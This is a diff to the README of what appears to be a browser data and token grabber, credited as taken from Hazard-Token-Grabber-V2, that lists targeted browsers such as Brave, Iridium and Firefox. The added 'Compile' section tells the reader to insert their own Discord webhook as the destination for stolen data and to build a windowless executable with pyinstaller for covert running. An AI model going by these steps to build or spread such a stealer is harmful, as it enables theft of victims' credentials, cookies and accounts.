@@ -19,3 +19,9 @@ Stole code from [Rdimo](https://github.com/Rdimo/Hazard-Token-Grabber-V2) and ad
 | Brave |
 | Iridium |
 | Firefox |
+
+## Compile
+1. Before doing everything, replace text 'WEBHOOK_HERE' (line 33) with your discord webhook.
+2. Install modules if needed.
+3. On the same directory as python file open command prompt and type:
+>pyinstaller --clean --onefile --noconsole -i NONE Data_Grabber.py
